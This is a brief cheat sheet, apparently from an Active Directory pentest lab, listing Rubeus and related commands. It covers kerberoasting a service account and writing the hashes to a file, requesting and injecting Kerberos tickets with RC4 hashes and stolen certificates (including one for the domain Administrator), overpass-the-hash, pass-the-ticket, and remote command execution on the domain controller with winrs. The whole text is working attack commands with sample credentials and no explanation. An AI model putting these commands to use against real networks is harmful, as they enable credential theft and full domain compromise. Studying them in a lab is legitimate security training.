### Rubeus
```
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
```
Rubeus.exe asktgt /user:pawadmin$ /rc4:<> /ptt
Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
Rubeus.exe ptt /ticket:TGTofUS-DC$
winrs -r:us-dc whoami
```
### Overpass-the-Hash
````
execute-assembly C:\Users\Public\Rubeus.exe  triage
Rubeus asktgt /user:n.John /rc4:2e8a408a8aec852ef2e458b938b8c071
Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
winrs -r:us-dc whoami
````
